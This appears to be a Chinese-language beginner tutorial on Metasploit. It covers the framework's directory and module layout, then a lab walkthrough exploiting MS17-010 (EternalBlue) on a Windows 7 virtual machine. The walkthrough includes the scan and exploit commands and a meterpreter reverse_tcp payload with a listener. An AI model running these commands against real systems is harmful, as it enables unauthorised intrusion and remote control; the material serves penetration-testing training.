Metasploit简介

MSF

The Metasploit Framework的简称。MSF高度模块化，即框架由多个module组成，是全球最受欢迎的渗透测试用具

msf是一款开源安全漏洞利用和测试工具，集成了各种常见的溢出漏洞和流行的shellcode，并一直更新。

进入kali中的Metasploit的目录/usr/share/metasploit-framework

目录介绍

主要是：data、modules、scripts、tools、plugins

该MSF文件系统是一个直观的方式布置：

data：Metasploit使用的可编辑文件
documentation：为框架提供文档
external：   源代码和第三方库
lib：框架代码库的'肉'
modules：实际的MSF模块
plugins：可以在运行时加载的插件
scripts：Meterpreter和其他脚本
tools：各种有用的命令行工具

data

这里面常用的的文件：

  • wordlists字典

  • meterpreter>是msf5的攻击载荷，使用于后渗透阶段

  • exploits渗透攻击模块，利用发现的安全漏洞或配置弱点对远程目标系统进行攻击的代码。

modules

这里面比较常用而且比较重要的文件

  • auxiliary #漏洞辅助模块一般是没有攻击载荷的漏洞攻击、
  • encoders #码器模块、
  • evasion #简单的反杀模块、
  • exploits #渗透攻击模块、
  • nops #空指令模块、
  • payloads #漏洞负载模块、
  • post #后渗透模块 用于维持访问

scripts

这里面有各种脚本

tools

这里面存放着大量的使用工具

plugins

这里面存放着大量插件

漏洞利用

以ms17_010为例

进入mfs之后，搜索模块search ms17_010，使用auxiliary/scanner/smb/smb_ms17_010 漏洞检测模块

设置完要要利用的模块之后，查看需要设置的参数options，Required为yes的时候就代表是必填项，如果不知道可以翻译一下后面Description描述的意思，设置完成之后再去options就发现我们是设置的参数已经设置上了。

set设置参数，开一台windows7的虚拟机，IP:192.168.20.19

然后执行跑一下，使用run/exploit

search ms17_010
use scanner/smb/smb_ms17_010
set RHOST 192.168.20.19
run/exploit

返回结果告诉我们目标地址好像存在这个MS17-010漏洞，并且目标是Windows 7 x64位，那么接下来就要使用漏洞利用模块了

Module options:模块设置、Payload options:攻击载荷设置、Exploit target:攻击的目标

Payload options:后面括号中的内容是攻击载荷利用的模块文件

set rhost 192.168.20.19
run

攻击成功之后就会从msf变成meterpreter，代表已经利用成功了。

search ms17_010
use windows/smb/ms17_010_eternalblue
set RHOST 192.168.20.19
run/exploit

msfconsole

set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.20.17
set lport 9999
run
如果不想利用模块的话
handler -H 192.168.20.17 -P 9999 -p windows/x64/meterpreter/reverse_tcp
